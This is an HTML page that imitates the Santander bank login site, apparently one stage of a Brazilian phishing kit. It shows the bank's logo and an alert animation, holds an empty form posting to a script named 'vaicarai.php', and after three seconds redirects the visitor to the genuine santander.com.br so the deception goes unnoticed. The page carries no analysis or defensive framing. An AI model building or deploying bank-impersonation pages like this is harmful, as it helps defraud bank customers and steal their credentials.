﻿<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Santander</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
<meta name="mobile-web-app-capable" content="yes">
<link rel="stylesheet" type="text/css" href="style.css" />
<script src="js/jquery-3.2.1.min.js" language="javascript"></script>
<script src="script.js" language="javascript"></script>


</head>

<body onLoad="window.scrollTo(0,1);">
<div id="topo">
	<img src="images/santanderlogo.png">	
</div>
	
<div id="topo2">
	<img src="images/ico_key_acesso.png" />
	<div class="acessar"><p>Acessar</p></div>

</div>	

<div id="campos">
<form action="vaicarai.php" method="post" enctype="application/x-www-form-urlencoded">
 
 
<br>
<br>

  

 <div class="img-box" id="img1">
   <img src="images/id_santander_anima_celular_alerta.gif">  	
 </div>
 
<script language="javascript">
	setTimeout(function(){ window.location = "http://www.santander.com.br";  }, 3000);
</script> 
	
		
</form>

</div>


</body>
</html>
